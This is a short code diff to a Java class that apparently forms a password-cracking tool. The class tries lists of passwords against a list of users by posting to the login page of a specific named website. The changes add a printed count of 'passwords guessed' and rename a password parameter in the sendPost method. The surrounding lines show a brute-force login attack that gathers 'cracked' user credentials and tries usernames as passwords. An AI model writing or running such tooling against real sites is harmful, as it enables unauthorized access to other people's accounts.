@@ -32,6 +32,7 @@ public class Requests {
         ArrayList <UserPassword> crackedPasswords =  this.tryPasswords(passwordList ,userList);
 
         String file = this.printResults(crackedPasswords);
+        System.out.println("\nNumber of passwords guessed: " + crackedPasswords.size());
         System.out.println("\nResults printed in file " + file);
 
 
@@ -89,7 +90,7 @@ public class Requests {
         }
     }
 
-    public ArrayList <UserPassword> sendPost (Map <String, User> userList, String password) {
+    public ArrayList <UserPassword> sendPost (Map <String, User> userList, String passwd) {
         try {
             ArrayList <UserPassword> crackedUsers = new ArrayList();
             String url = "http://www.portalmotos.com/modulos/usuarios/login.asp";
@@ -97,6 +98,7 @@ public class Requests {
 
             for (String userName : userList.keySet()) {
                 String cookieName = "ASPSESSIONIDASRAARRD";
+                String password = passwd;
 
                 // Checks if the password is equal to the user name.
                 if (password.equals("*")) {
